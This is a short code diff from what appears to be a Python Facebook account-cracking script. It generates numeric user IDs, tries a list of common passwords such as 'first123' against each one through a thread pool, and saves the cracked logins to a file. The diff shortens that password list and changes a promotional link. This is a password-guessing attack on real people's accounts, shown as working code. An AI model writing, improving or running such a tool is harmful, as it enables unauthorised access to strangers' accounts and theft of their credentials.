@@ -47,7 +47,7 @@ def ALEX():
     if opt == 'A':
         main()
     if None == 'B':
-        os.system('xdg-open https://www.facebook.com/krahim2')
+        os.system('xdg-open https://www.facebook.com/copy.link.erorr404')
         return None
     if None == 'C':
         os.system('xdg-open https://github.com/Rahim')
@@ -194,7 +194,7 @@ def main():
 	    print(' \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××')
 	    for guru in user:
 		    uid = kode+guru
-		    pwx = [guru, 'bangladesh','Bangladesh','i love you','I Love You','free fire','firstlast','first last','first123','first1234','first12345','first123456','first1122','first@123',]
+		    pwx = [guru, 'firstlast','first last','first123','first1234',]
 		    yaari.submit(rcrack,uid,pwx,tl)
     print('\nCRACK PROCESS HAS BEEN COMPLETED ')
     print('\nIDS SAVED IN Rahim-OK.txt')
